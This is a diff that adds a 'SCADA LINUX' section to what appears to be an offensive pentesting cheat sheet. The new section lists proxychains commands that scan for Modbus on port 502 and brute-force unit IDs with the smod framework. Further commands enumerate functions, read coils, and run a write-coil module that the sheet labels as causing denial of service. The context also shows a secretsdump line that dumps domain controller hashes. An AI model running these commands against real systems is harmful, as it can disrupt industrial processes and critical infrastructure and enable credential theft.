@@ -601,6 +601,36 @@ export KRB5CCNAME=<CACHEOFTGT>
 proxychains secretsdump.py -outputfile <DCFQDN>_hashes -k <DCFQDN> -just-dc;
 ```
 
+###### SCADA LINUX
+```txt
+# discover modbus
+proxychains nmap -v -sT -p502 -sV -oA <NETWORK>_modbusscan --open <NETWORK/CIDR>
+
+# initial access via brute uid
+proxychains python smod.py 
+> use modbus/scanner/uid
+> set RHOSTS <IP>
+> exploit
+
+# enumeration, get functions
+> use modbus/scanner/getfunc # or > use modbus/scanner/getfunc
+> set RHOSTS <IP>
+> set RPORT 502
+> set UID <UID>
+> exploit
+
+# read coils
+> use modbus/function/readCoils
+...
+> exploit
+
+# write coil (will cause DOS!)
+> use modbus/dos/writeSingleCoils
+> show options
+...
+> exploit
+```
+
 ###### PRINTERS
 ```txt
 # discover ipprinters
